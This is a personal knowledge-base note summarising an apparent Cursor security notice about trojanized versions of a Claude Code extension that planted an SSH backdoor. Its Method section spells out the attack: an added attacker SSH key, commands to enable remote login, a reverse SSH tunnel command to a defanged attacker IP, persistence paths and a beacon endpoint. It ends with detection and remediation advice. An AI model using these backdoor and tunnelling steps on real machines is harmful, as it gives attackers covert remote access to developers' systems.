---
date: 2026-10-31
section: AI
importance: High
kind: news
source: "Cursor security notice"
url: https://cursor.com/blog/claude-code-extension-security-notice
status: unread
id: 2026-10-31-trojanized-claude-code-extension-cursor
---
2026-10-31 07:16
Tags: #daily-knowledge #ai

---
# A trojanized Claude Code extension on Cursor's marketplace planted an SSH backdoor

Modified versions 2.1.312 and 2.1.313 of the anthropic.claude-code extension were served from Cursor's VS Code extension marketplace on 29 October, roughly 2:27 am to 1:35 pm PT. They added an attacker SSH key, tried to open a reverse SSH tunnel and installed persistence. Cursor pulled them, rebuilt the marketplace and published IOCs and remediation scripts.

## Details

**Problem**
Someone put a malicious build of a trusted AI coding-agent extension, under its legitimate extension ID, into a third-party marketplace. Auto-updating users received it without doing anything. Cursor has not said how the package got in.

**Method**
- Code was inserted into extension.js (SHA-256 ecb58cb2...6bf15) and ran on extension load. It collected the hostname, username, OS, home and working directories, Git email, public IP and the names of environment variables.
- It appended an SSH key with the comment 'svc-telemetry' to authorized_keys and tried to enable sshd (systemsetup -setremotelogin on, Add-WindowsCapability OpenSSH.Server). It then ran ssh -N -R '*:0:localhost:22' or autossh to tunnel@134[.]209[.]82[.]225, retrying about every 60 seconds.
- Persistence: ~/Library/LaunchAgents/com.apple.sysmond.plist on macOS; a SYSTEM scheduled task 'SysMon' with a Startup-folder sysmon.cmd fallback on Windows. Dropped files: ~/.config/.smt, ~/.config/.smtk and .stk_<10 hex> in the temp folder. Beacon: HTTP POST to 134[.]209[.]82[.]225:8099/beacon.

**Results**
- Affected: Windows and macOS installs from the Cursor marketplace only. Cursor has no evidence that other extensions or the official distribution were touched.
- Cursor says the SSH-enable step generally failed because of bugs in the malicious code or missing admin rights, but the key and persistence could still be installed.

**Caveats**
Cursor gives no root cause and no confirmed count of victims. Cursor warns that uninstalling the extension may not be enough; rebuild hosts where the payload ran.

**For your work**
Grep developer machines for 'svc-telemetry' in authorized_keys and for the SysMon and com.apple.sysmond artifacts. Pin agent extensions to the official marketplace and turn off auto-update for them on client laptops.

**Concepts:** [[Agent security]] · [[Coding agents]] · [[Claude]]
**From:** [[2026-10-31]]

# My notes


---
# References
[Cursor security notice](https://cursor.com/blog/claude-code-extension-security-notice)
